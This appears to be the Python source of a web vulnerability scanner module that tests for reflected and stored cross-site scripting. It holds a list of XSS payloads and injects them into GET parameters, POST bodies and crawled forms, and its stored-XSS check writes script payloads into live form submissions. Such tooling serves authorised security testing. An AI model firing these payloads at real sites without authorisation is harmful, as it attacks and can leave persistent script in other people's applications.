"""Falcon MAG Framework - XSS Scanner (Reflected)
Real payload injection + context-aware detection. No false positives."""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from core.logger import get_logger

log = get_logger("xss")


# Real XSS payloads
PAYLOADS = [
    # Basic (require < or > breakout)
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    # Attribute break
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Image error
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    # SVG
    "<svg/onload=alert(1)>",
    # Event handler (require quote breakout)
    '" onmouseover=alert(1) x="',
    "' onmouseover=alert(1) x='",
    # HTML5
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    # Polyglot
    "<svg/onload=alert(1) x=\"",
]

# Unique marker to verify reflection
MARKER = "FalconXSS1337"


def _inject_param(url: str, param: str, payload: str) -> str:
    """Replace one query parameter with payload."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _find_context(html: str, payload: str) -> dict:
    """Find where the payload landed in the HTML."""
    idx = html.find(payload)
    if idx < 0:
        # Try finding the marker instead
        return None

    before = html[max(0, idx - 100):idx]
    after = html[idx + len(payload):idx + len(payload) + 100]

    # Determine context
    context_type = "html"
    if re.search(r"<[^>]*$", before):
        context_type = "attribute"
    elif re.search(r"<script[^>]*>[^<]*$", before, re.IGNORECASE):
        context_type = "script"
    elif re.search(r'=["\'][^"\']*$', before):
        context_type = "quoted_attr"

    # Check if payload is unescaped
    is_raw = True
    if "&lt;" in before[-30:] or "&gt;" in before[-30:]:
        is_raw = False
    if "&quot;" in before[-30:] or "&#" in before[-30:]:
        is_raw = False

    return {
        "type": context_type,
        "before": before[-80:],
        "after": after[:80],
        "is_raw": is_raw,
    }


def _verify_reflection(html: str, payload: str) -> bool:
    """Return True ONLY if payload is reflected UNESCAPED in a dangerous way.

    Filters:
      - Encoded reflections (&lt;, &gt;, &quot;, &#x...) → not vulnerable
      - Payload in plain HTML text without < or > → not exploitable
    """
    if not html or not payload:
        return False

    # 1. Payload must contain an actual tag breakout (< or ") to be exploitable
    #    (unless it's a very rare case of attribute injection without <>
    has_tag_open = "<" in payload
    has_quote_break = '"' in payload or "'" in payload

    if not has_tag_open and not has_quote_break:
        # No exploitable breakout → reject (javascript: in text is safe)
        return False

    # 2. Find raw reflection
    idx = html.find(payload)
    if idx < 0:
        return False

    # 3. Check if the payload is HTML-encoded in the response
    # Take the char right before payload, look for common encodings
    # If < appears as &lt; right before, it's encoded
    before_ctx = html[max(0, idx - 30):idx]
    if "&lt;" in before_ctx or "&gt;" in before_ctx or "&quot;" in before_ctx:
        return False

    # 4. Check the payload itself isn't present as escaped text nearby
    #    Example: searching for <script> but finding &lt;script&gt;
    escaped_variants = [
        payload.replace("<", "&lt;").replace(">", "&gt;"),
        payload.replace('"', "&quot;"),
        payload.replace("'", "&#39;"),
    ]
    for esc in escaped_variants:
        if esc != payload and esc in html:
            return False

    return True


def _collect_test_urls(config, crawl_result) -> list:
    """Collect URLs with query parameters to test.

    Includes: target, discovered params, crawl pages, GET forms.
    """
    from urllib.parse import urlparse, urlunparse
    urls = set()

    target = config.get("target", "")
    if "?" in target:
        urls.add(target)

    # === ADDED: GET forms from crawler ===
    get_forms = config.get("_crawl_forms_get", []) or []
    for form in get_forms:
        u = form.get("url") if isinstance(form, dict) else None
        if u and "?" in u:
            urls.add(u)
    # === END ===

    # === ADDED: inject discovered params ===
    discovered = config.get("_discovered_params", []) or []
    if discovered and target:
        parsed = urlparse(target)
        for param in discovered[:15]:  # cap at 15 for speed
            new_q = f"{param}=1"
            if parsed.query:
                new_q = parsed.query + "&" + new_q
            url_with_param = urlunparse(parsed._replace(query=new_q))
            urls.add(url_with_param)
    # === END ===

    if crawl_result:
        for page in crawl_result.get("pages", []):
            if isinstance(page, dict) and "?" in page.get("url", ""):
                urls.add(page["url"])
            elif isinstance(page, str) and "?" in page:
                urls.add(page)

    if crawl_result:
        for u in crawl_result.get("visited", []):
            if isinstance(u, str) and "?" in u:
                urls.add(u)

    return sorted(urls)




def _extract_post_params(config):
    """Extract POST body params from config (form or JSON).

    Returns list of (param_name, original_value, is_json) tuples.
    """
    params = []

    post_data = config.get("_post_data", "") or ""
    if post_data:
        try:
            parsed = parse_qs(post_data, keep_blank_values=True)
            for k, v in parsed.items():
                params.append((k, v[0] if v else "", False))
        except Exception:
            pass

    post_json = config.get("_post_json", "") or ""
    if post_json:
        try:
            import json as _json
            data = _json.loads(post_json)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, str(v), True))
        except Exception:
            pass

    return params



def _get_targets_with_params(config, target):
    """Collect all URL+param combinations including discovered params."""
    from urllib.parse import urlparse, urlunparse

    targets = []

    # 1. Original target with existing params
    parsed = urlparse(target)
    if parsed.query:
        targets.append(target)

    # 2. Use discovered params from param_discovery
    discovered = config.get("_discovered_params", []) or []
    if discovered:
        # Add target with first 10 discovered params (cap for speed)
        for param in discovered[:10]:
            new_query = f"{param}=1"
            if parsed.query:
                new_query = parsed.query + "&" + new_query
            url_with_param = urlunparse(parsed._replace(query=new_query))
            targets.append(url_with_param)

    # 3. Crawled URLs with params
    crawl = config.get("_crawl_result", {}) or {}
    for page in crawl.get("pages", []) or []:
        if isinstance(page, str) and "?" in page:
            targets.append(page)
        elif isinstance(page, dict) and page.get("url") and "?" in page.get("url", ""):
            targets.append(page["url"])

    # Deduplicate
    return list(set(targets))



def run(client, config, crawl_result=None) -> dict:
    """Run reflected XSS scan."""
    target = config.get("target", "")
    log.info(f"💉 XSS Scan on {target}")

    result = {
        "target": target,
        "tested": 0,
        "vulnerable": [],
        "tested_urls": [],
        "payloads_used": len(PAYLOADS),
    }

    # Collect URLs with parameters
    urls = _collect_test_urls(config, crawl_result)

    if not urls:
        log.info("  ℹ No URLs with query parameters found")

    log.info(f"  ℹ {len(urls)} URL(s) with parameters")

    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            continue

        result["tested_urls"].append(url)

        for param in params:
            for payload in PAYLOADS:
                result["tested"] += 1
                test_url = _inject_param(url, param, payload)

                resp = client.scan_request(test_url)
                if not resp or resp.status == 0:
                    continue

                # Check if payload is reflected raw
                if _verify_reflection(resp.text, payload):
                    ctx = _find_context(resp.text, payload)
                    if ctx and ctx.get("is_raw"):
                        finding = {
                            "url": url,
                            "test_url": test_url,
                            "param": param,
                            "payload": payload,
                            "context_type": ctx["type"],
                            "context_before": ctx["before"],
                            "context_after": ctx["after"],
                            "severity": "high",
                        }
                        result["vulnerable"].append(finding)
                        log.warning(f"  ⚠ XSS FOUND: {param} on {url[:60]}")
                        break  # next param

    # ==========================================================
    # POST body scanning
    # ==========================================================
    post_params = _extract_post_params(config)
    if post_params:
        log.info(f"  ℹ {len(post_params)} POST parameter(s) to test")
        method = config.get("_http_method", "GET")
        post_json_raw = config.get("_post_json", "") or ""
        post_data_raw = config.get("_post_data", "") or ""

        for param_name, orig_value, is_json in post_params:
            for payload in PAYLOADS:
                result["tested"] += 1

                # Build mutated body
                try:
                    if is_json:
                        import json as _json
                        body = _json.loads(post_json_raw)
                        body[param_name] = payload
                        resp = client.request("POST", target, json=body)
                    else:
                        parsed = parse_qs(post_data_raw, keep_blank_values=True)
                        parsed[param_name] = [payload]
                        new_body = urlencode(parsed, doseq=True)
                        resp = client.request("POST", target, data=new_body)
                except Exception as e:
                    log.debug("POST inject failed: " + str(e))
                    continue

                if not resp or resp.status == 0:
                    continue

                # Check reflection
                if _verify_reflection(resp.text, payload):
                    ctx = _find_context(resp.text, payload)
                    if ctx and ctx.get("is_raw"):
                        finding = {
                            "url": target,
                            "test_url": target,
                            "original_url": target,
                            "injected_url": target,
                            "param": param_name,
                            "payload": payload,
                            "context_type": ctx["type"],
                            "context_before": ctx["before"],
                            "context_after": ctx["after"],
                            "severity": "high",
                            "method": "POST",
                            "description": "Reflected XSS in POST param '" + param_name + "'",
                        }
                        result["vulnerable"].append(finding)
                        log.warning(f"  ⚠ XSS (POST) FOUND: {param_name} on {target[:60]}")
                        break  # next param

    # === STORED XSS TESTING (ADDED 2026-09-20) ===
    try:
        import re as _re
        from urllib.parse import urljoin as _urljoin
        stored_forms = config.get("_crawl_forms_post", []) or []

        if not stored_forms:
            tgt = config.get("target", "")
            resp_html = client.get(tgt)
            if resp_html and resp_html.status == 200:
                form_tags = _re.findall(r"<form[^>]*>", resp_html.text, _re.IGNORECASE)
                form_bodies = _re.findall(r"<form[^>]*>(.*?)</form>", resp_html.text, _re.IGNORECASE | _re.DOTALL)
                for i, tag in enumerate(form_tags):
                    mm = _re.search(r'method=["\']?(\w+)', tag, _re.IGNORECASE)
                    m = (mm.group(1) if mm else "GET").upper()
                    if m != "POST":
                        continue
                    am = _re.search(r'action=["\']([^"\']*)["\']', tag, _re.IGNORECASE)
                    act = am.group(1) if am else tgt
                    if act and not act.startswith(("http://", "https://")):
                        act = _urljoin(tgt, act)
                    body_html = form_bodies[i] if i < len(form_bodies) else ""
                    inputs = _re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body_html, _re.IGNORECASE)
                    inputs += _re.findall(r'<(?:textarea|select)[^>]+name=["\']([^"\']+)["\']', body_html, _re.IGNORECASE)
                    if inputs:
                        stored_forms.append({
                            "action": act,
                            "body": "&".join(n + "=test" for n in inputs),
                            "fields": inputs,
                        })

        if stored_forms:
            log.info("  Found " + str(len(stored_forms)) + " POST form(s) for Stored XSS test")

        for form in stored_forms[:3]:
            action = form.get("action", "")
            body_template = form.get("body", "")
            fields = form.get("fields", [])
            if not action or not body_template or not fields:
                continue
            test_fields = [f for f in fields if any(
                k in f.lower() for k in ("name", "message", "comment", "content", "text", "title", "body", "mtx")
            )] or fields[:2]

            for field in test_fields:
                unique_marker = "FalconStored" + str(int(time.time()))
                payload = "<script>alert('" + unique_marker + "')</script>"
                parts = body_template.split("&")
                new_parts = []
                for p in parts:
                    if "=" in p:
                        k, v = p.split("=", 1)
                        if k == field:
                            new_parts.append(k + "=" + payload)
                        else:
                            new_parts.append(p)
                    else:
                        new_parts.append(p)
                new_body = "&".join(new_parts)
                result["tested"] += 1
                try:
                    client.request("POST", action, data=new_body,
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
                    resp2 = client.get(action)
                except Exception:
                    continue
                if not resp2 or resp2.status != 200:
                    continue
                if ("<script>alert('" + unique_marker + "')</script>") in resp2.text:
                    log.warning("  STORED XSS in '" + field + "' on " + action[:60])
                    result["vulnerable"].append({
                        "url": action,
                        "original_url": action,
                        "injected_url": action,
                        "test_url": action,
                        "param": field,
                        "payload": payload,
                        "method": "POST",
                        "severity": "high",
                        "context_type": "stored",
                    })
                    break
    except Exception as _e:
        log.debug("Stored XSS test failed: " + str(_e))

    log.info(f"  ✓ Tested: {result['tested']}")
    log.info(f"  ⚠ Vulnerable: {len(result['vulnerable'])}")
    return result